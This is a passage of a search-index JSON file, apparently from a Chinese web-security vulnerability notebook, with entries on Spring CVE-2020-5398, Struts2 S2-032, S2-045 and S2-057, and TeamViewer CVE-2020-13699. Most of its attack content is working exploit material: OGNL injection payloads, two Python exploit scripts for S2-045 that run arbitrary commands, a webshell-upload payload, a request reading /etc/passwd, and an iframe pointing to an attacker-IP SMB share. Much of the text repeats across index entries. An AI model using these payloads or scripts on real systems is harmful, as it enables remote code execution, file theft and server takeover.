\u6216 5.0.16 \u7248\u672c\u3002","title":"CVE-2020-5398-Spring MVC\u7684RFD\uff08\u53cd\u5c04\u6587\u4ef6\u4e0b\u8f7d\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_1","text":"\u4e8e\u5f53\u5730\u65f6\u95f41\u670816\u65e5\uff0c Pivotal Software\uff08Spring\u7cfb\u5217\uff09\u5b98\u65b9\u53d1\u5e03 Spring Framework \u5b58\u5728 RFD\uff08\u53cd\u5c04\u578b\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff09\u7684\u6f0f\u6d1e\u62a5\u544a\uff0c\u6b64\u6f0f\u6d1e\u4e3a\u653b\u51fb\u5ba2\u6237\u7aef\u7684\u6f0f\u6d1e\uff0c\u5b98\u65b9\u5c06\u6f0f\u6d1e\u4e25\u91cd\u7a0b\u5ea6\u8bc4\u4e3a\u9ad8\u3002\u62a5\u544a\u6307\u51fa\uff0c\u5f53\u54cd\u5e94\u4e2d\u8bbe\u7f6e\u4e86\u201cContent-Disposition\u201d\u5934\u4e14filename\u5c5e\u6027\u662f\u7528\u6237\u53ef\u63a7\u65f6\u5bb9\u6613\u53d7\u5230RFD\u653b\u51fb\u3002\u653b\u51fb\u5e94\u6ee1\u8db3\u4ee5\u4e0b\u6240\u6709\u6761\u4ef6\u624d\u53ef\u6210\u529f\uff1a 1.header\u4f7f\u7528org.springframework.http.ContentDisposition\u6765\u9884\u5907 2.\u6587\u4ef6\u540d\u662f\u901a\u8fc7ContentDisposition.Builder#filename(String) \u6216 ContentDisposition.Builder#filename(String, US_ASCII)\u6765\u8bbe\u7f6e\u3002 3.\u6587\u4ef6\u540d\uff08\u5305\u62ec\u6587\u4ef6\u540d\u540e\u7f00\uff09\u4e3a\u7528\u6237\u53ef\u63a7\u3002 4.\u653b\u51fb\u8005\u5df2\u5c06\u4e0b\u8f7d\u7684\u54cd\u5e94\u5185\u5bb9\u6ce8\u5165\u6076\u610f\u547d\u4ee4\u3002 \u653b\u51fb\u8005\u53ef\u5229\u7528RFD\u6f0f\u6d1e\uff0c\u7ed3\u5408\u793e\u5de5\u7b49\u65b9\u5f0f\uff0c\u8ba9\u7528\u6237\u4e0b\u8f7d\u4e00\u4e2a\u6076\u610f\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u4ece\u800c\u5371\u5bb3\u7528\u6237\u7684\u7ec8\u7aef\u5b89\u5168\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_2","text":"Spring Framework 5.2.0 to 5.2.2\uff0c5.1.0 to 5.1.12\uff0c5.0.0 to 5.0.15","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#poc","text":"GET /?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20- HTTP/1.1 Host: 192.168.248.129:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1","title":"POC"},{"location":"Web%E5%AE%89%E5%85%A8/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/#_3","text":"\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5347\u7ea7\u81f3 Spring Framework 5.2.3\uff0c5.1.13 \u6216 5.0.16 \u7248\u672c\u3002","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Struts 2.3.20 - Struts Struts 2.3.28\uff082.3.20.3\u548c2.3.24.3\u9664\u5916\uff09 EXP \u00b6 ?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat /etc/passwd","title":"Struts2 S2-032\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","text":"Struts 2.3.20 - Struts Struts 2.3.28\uff082.3.20.3\u548c2.3.24.3\u9664\u5916\uff09","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp","text":"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat /etc/passwd","title":"EXP"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Struts 2.3.5 \u2013 Struts 2.3.31 Struts 2.5 \u2013 Struts 2.5.10 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 Content-Type:%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())} \u6f0f\u6d1e\u9a8c\u8bc1EXP \u00b6 import requests import sys import httplib def poc(url): httplib.HTTPConnection._http_vsn_str='HTTP/1.0' payload = \"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}\" headers = {} headers[\"Content-Type\"] = payload r = requests.get(url, headers=headers) if \"105059592\" in r.content: return True return False if __name__ == '__main__': if len(sys.argv) == 1: print \"python s2-045.py target\" sys.exit() elif poc(sys.argv[1]): print \"vulnerable\" else: print \"not vulnerable\" \u547d\u4ee4\u6267\u884cPOC \u00b6 Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \u547d\u4ee4\u6267\u884cEXP \u00b6 #!/usr/bin/python # -*- coding: utf-8 -*- import urllib2 import httplib def exploit(url, cmd): payload = \"%{(#_='multipart/form-data').\" payload += \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\" payload += \"(#_memberAccess?\" payload += \"(#_memberAccess=#dm):\" payload += \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\" payload += \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\" payload += \"(#ognlUtil.getExcludedPackageNames().clear()).\" payload += \"(#ognlUtil.getExcludedClasses().clear()).\" payload += \"(#context.setMemberAccess(#dm)))).\" payload += \"(#cmd='%s').\" % cmd payload += \"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\" payload += \"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\" payload += \"(#p=new java.lang.ProcessBuilder(#cmds)).\" payload += \"(#p.redirectErrorStream(true)).(#process=#p.start()).\" payload += \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\" payload += \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\" payload += \"(#ros.flush())}\" try: headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload} request = urllib2.Request(url, headers=headers) page = urllib2.urlopen(request).read() except httplib.IncompleteRead, e: page = e.partial print(page) return page if __name__ == '__main__': import sys if len(sys.argv) != 3: print(\"[*] struts2_S2-045.py <url> <cmd>\") else: print('[*] CVE: 2017-5638 - Apache Struts2 S2-045') url = sys.argv[1] cmd = sys.argv[2] print(\"[*] cmd: %s\\n\" % cmd) exploit(url, cmd) GetShell POC\uff08\u6587\u4ef6\u4e0a\u4f20\uff09 \u00b6 GET\u5305\u4fee\u6539\u4e3aPOST\uff0c\u6dfb\u52a0\u53c2\u6570?f=a.jsp\uff0c\u5185\u5bb9\u4e3a\u60f3\u8981\u4e0a\u4f20\u7684\u5185\u5bb9\u5373\u53ef\u3002 _multipart/form-data%{(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#f=new java.io.File(#req.getRealPath('/'),#req.getParameter('f'))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))}","title":"Struts2 S2-045\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","text":"Struts 2.3.5 \u2013 Struts 2.3.31 Struts 2.5 \u2013 Struts 2.5.10","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","text":"Content-Type:%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp","text":"import requests import sys import httplib def poc(url): httplib.HTTPConnection._http_vsn_str='HTTP/1.0' payload = \"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}\" headers = {} headers[\"Content-Type\"] = payload r = requests.get(url, headers=headers) if \"105059592\" in r.content: return True return False if __name__ == '__main__': if len(sys.argv) == 1: print \"python s2-045.py target\" sys.exit() elif poc(sys.argv[1]): print \"vulnerable\" else: print \"not vulnerable\"","title":"\u6f0f\u6d1e\u9a8c\u8bc1EXP"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc_1","text":"Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}","title":"\u547d\u4ee4\u6267\u884cPOC"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp_1","text":"#!/usr/bin/python # -*- coding: utf-8 -*- import urllib2 import httplib def exploit(url, cmd): payload = \"%{(#_='multipart/form-data').\" payload += \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\" payload += \"(#_memberAccess?\" payload += \"(#_memberAccess=#dm):\" payload += \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\" payload += \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\" payload += \"(#ognlUtil.getExcludedPackageNames().clear()).\" payload += \"(#ognlUtil.getExcludedClasses().clear()).\" payload += \"(#context.setMemberAccess(#dm)))).\" payload += \"(#cmd='%s').\" % cmd payload += \"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\" payload += \"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\" payload += \"(#p=new java.lang.ProcessBuilder(#cmds)).\" payload += \"(#p.redirectErrorStream(true)).(#process=#p.start()).\" payload += \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\" payload += \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\" payload += \"(#ros.flush())}\" try: headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload} request = urllib2.Request(url, headers=headers) page = urllib2.urlopen(request).read() except httplib.IncompleteRead, e: page = e.partial print(page) return page if __name__ == '__main__': import sys if len(sys.argv) != 3: print(\"[*] struts2_S2-045.py <url> <cmd>\") else: print('[*] CVE: 2017-5638 - Apache Struts2 S2-045') url = sys.argv[1] cmd = sys.argv[2] print(\"[*] cmd: %s\\n\" % cmd) exploit(url, cmd)","title":"\u547d\u4ee4\u6267\u884cEXP"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#getshell-poc","text":"GET\u5305\u4fee\u6539\u4e3aPOST\uff0c\u6dfb\u52a0\u53c2\u6570?f=a.jsp\uff0c\u5185\u5bb9\u4e3a\u60f3\u8981\u4e0a\u4f20\u7684\u5185\u5bb9\u5373\u53ef\u3002 _multipart/form-data%{(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#f=new java.io.File(#req.getRealPath('/'),#req.getParameter('f'))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))}","title":"GetShell POC\uff08\u6587\u4ef6\u4e0a\u4f20\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/","text":"\u5f71\u54cd\u73af\u5883 \u00b6 Struts <= Struts 2.3.34, Struts 2.5.16 \u5229\u7528 \u00b6 S2-057\u8981\u6c42\u5177\u5907\u4ee5\u4e0b\u6761\u4ef6: action\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e\u540d\u79f0\u7a7a\u95f4\u5c5e\u6027\uff0c\u6216\u8005\u4f7f\u7528\u4e86\u901a\u914d\u7b26 \u540d\u79f0\u7a7a\u95f4\u5c06\u7531\u7528\u6237\u4eceuri\u4f20\u9012\u5e76\u89e3\u6790\u4e3aOGNL\u8868\u8fbe\u5f0f\uff0c\u6700\u7ec8\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 Payload:``` http://your-ip:8080/%24%7b%31%2b%31%7d/actionChain1.action \u53ef\u4ee5\u770b\u5230\u7b97\u51fa\u4e861+1=2\u7684\u7ed3\u679c \u53c2\u8003POC \uff1ahttps://github.com/Fnzer0/S2-057-poc python 1.py -u http://192.168.111.129:8080/{{INJECTION_POINT}}/actionChain1.action -p S2-057-2 -c id --exp \u53d1\u73b0\u6267\u884c\u4e86id\u547d\u4ee4","title":"Struts2 S2-057 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2018-11776)"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/#_1","text":"Struts <= Struts 2.3.34, Struts 2.5.16","title":"\u5f71\u54cd\u73af\u5883"},{"location":"Web%E5%AE%89%E5%85%A8/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/#_2","text":"S2-057\u8981\u6c42\u5177\u5907\u4ee5\u4e0b\u6761\u4ef6: action\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e\u540d\u79f0\u7a7a\u95f4\u5c5e\u6027\uff0c\u6216\u8005\u4f7f\u7528\u4e86\u901a\u914d\u7b26 \u540d\u79f0\u7a7a\u95f4\u5c06\u7531\u7528\u6237\u4eceuri\u4f20\u9012\u5e76\u89e3\u6790\u4e3aOGNL\u8868\u8fbe\u5f0f\uff0c\u6700\u7ec8\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 Payload:``` http://your-ip:8080/%24%7b%31%2b%31%7d/actionChain1.action \u53ef\u4ee5\u770b\u5230\u7b97\u51fa\u4e861+1=2\u7684\u7ed3\u679c \u53c2\u8003POC \uff1ahttps://github.com/Fnzer0/S2-057-poc python 1.py -u http://192.168.111.129:8080/{{INJECTION_POINT}}/actionChain1.action -p S2-057-2 -c id --exp \u53d1\u73b0\u6267\u884c\u4e86id\u547d\u4ee4","title":"\u5229\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/","text":"TeamViewer \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-13699) \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 15:53:05 \u5f71\u54cd\u7248\u672c \u00b6 TeamViewer < 8.0.258861 TeamViewer < 9.0.28860 TeamViewer < 10.0.258873 TeamViewer < 11.0.258870 TeamViewer < 12.0.258869 TeamViewer < 13.2.36220 TeamViewer < 14.2.56676 TeamViewer < 15.8.3 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 TeamViewer\u5b58\u5728\u672a\u5f15\u7528\u7684\u641c\u7d22\u8def\u5f84\u6216\u5143\u7d20\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u7531\u4e8e\u5e94\u7528\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u5f15\u7528\u5b83\u7684\u81ea\u5b9a\u4e49URI\u5904\u7406\u7a0b\u5e8f\uff0c\u5f53\u5b89\u88c5\u6709TeamViewer\u7684\u6613\u53d7\u653b\u51fb\u7248\u672c\u7684\u7cfb\u7edf\u8bbf\u95ee\u6076\u610f\u521b\u5efa\u7684\u7f51\u7ad9\u65f6\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7cbe\u5fc3\u5236\u4f5c\u7684URL \uff08iframe src='teamviewer10: --play \\\\attacker-IP\\share\\fake.tvs'\uff09 \u5c06\u6076\u610fiframe\u5d4c\u5165\u7f51\u7ad9\u4e2d\uff0c\u4ece\u800c\u542f\u52a8TeamViewer Windows\u684c\u9762\u5ba2\u6237\u7aef\u5e76\u5f3a\u5236\u5176\u6253\u5f00\u8fdc\u7a0bSMB\u5171\u4eab\u3002 Windows\u5c06\u5728\u6253\u5f00SMB\u5171\u4eab\u65f6\uff0c\u6267\u884cNTLM\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u4e14\u53ef\u4ee5\u8f6c\u53d1\u8be5\u8bf7\u6c42\uff08\u4f7f\u7528\u5982\u54cd\u5e94\u7a0b\u5e8f\u4e4b\u7c7b\u7684\u5de5\u5177\uff09\u4ee5\u6267\u884c\u4ee3\u7801\uff08\u6216\u6355\u83b7\u8be5\u8bf7\u6c42\u4ee5\u8fdb\u884c\u54c8\u5e0c\u7834\u89e3\uff09 \u4fee\u590d\u5efa\u8bae \u00b6 \u9488\u5bf9\u6b64\u6f0f\u6d1e\u5b98\u65b9\u5df2\u57288.0.258861\u30019.0.258860\u300110.0.258873\u300111.0.258870\u300112.0.258869\u300113.2.36220\u300114.2.56676\u300114.7.48350\u548c15.8.3\u7248\u672c\u4e2d\u4fee\u590d\u3002 \u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u53c2\u8003\u4ee5\u4e0b\u94fe\u63a5\u5b89\u88c5\u8865\u4e01\u66f4\u65b0\uff1ahttps://www.teamviewer.com/en/download/previous-versions/","title":"TeamViewer \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-13699)"},{"location":"Web%E5%AE%89%E5%85%A8/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#teamviewer-cve-2020-13699","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 15:53:05","title":"TeamViewer \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-13699)"},{"location":"Web%E5%AE%89%E5%85%A8/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_1","text":"TeamViewer < 8.0.258861 TeamViewer < 9.0.28860 TeamViewer < 10.0.258873 TeamViewer < 11.0.258870 TeamViewer < 12.0.258869 TeamViewer < 13.2.36220 TeamViewer < 14.2.56676 TeamViewer < 15.8.3","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_2","text":"TeamViewer\u5b58\u5728\u672a\u5f15\u7528\u7684\u641c\u7d22\u8def\u5f84\u6216\u5143\u7d20\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u7531\u4e8e\u5e94\u7528\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u5f15\u7528\u5b83\u7684\u81ea\u5b9a\u4e49URI\u5904\u7406\u7a0b\u5e8f\uff0c\u5f53\u5b89\u88c5\u6709TeamViewer\u7684\u6613\u53d7\u653b\u51fb\u7248\u672c\u7684\u7cfb\u7edf\u8bbf\u95ee\u6076\u610f\u521b\u5efa\u7684\u7f51\u7ad9\u65f6\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7cbe\u5fc3\u5236\u4f5c\u7684URL \uff08iframe src='teamviewer10: --play \\\\attacker-IP\\share\\fake.tvs'\uff09 \u5c06\u6076\u610fiframe\u5d4c\u5165\u7f51\u7ad9\u4e2d\uff0c\u4ece\u800c\u542f\u52a8TeamViewer Windows\u684c\u9762\u5ba2\u6237\u7aef\u5e76\u5f3a\u5236\u5176\u6253\u5f00\u8fdc\u7a0bSMB\u5171\u4eab\u3002 Windows\u5c06\u5728\u6253\u5f00SMB\u5171\u4eab\u65f6\uff0c\u6267\u884cNTLM\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u4e14\u53ef\u4ee5\u8f6c\u53d1\u8be5\u8bf7\u6c42\uff08\u4f7f\u7528\u5982\u54cd\u5e94\u7a0b\u5e8f\u4e4b\u7c7b\u7684\u5de5\u5177\uff09\u4ee5\u6267\u884c\u4ee3\u7801\uff08\u6216\u6355\u83b7\u8be5\u8bf7\u6c42\u4ee5\u8fdb\u884c\u54c8\u5e0c\u7834\u89e3\uff09","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_3","text":"\u9488\u5bf9\u6b64\u6f0f\u6d1e\u5b98\u65b9\u5df2\u57288.0.258861\u30019.0.258860\u300110.0.258873\u300111.0.258870\u300112.0.258869\u300113.2.36220\u300114.2.56676\u300114.7.48350\u548c15.8.3\u7248\u672c\u4e2d\u4fee\u590d\u3002 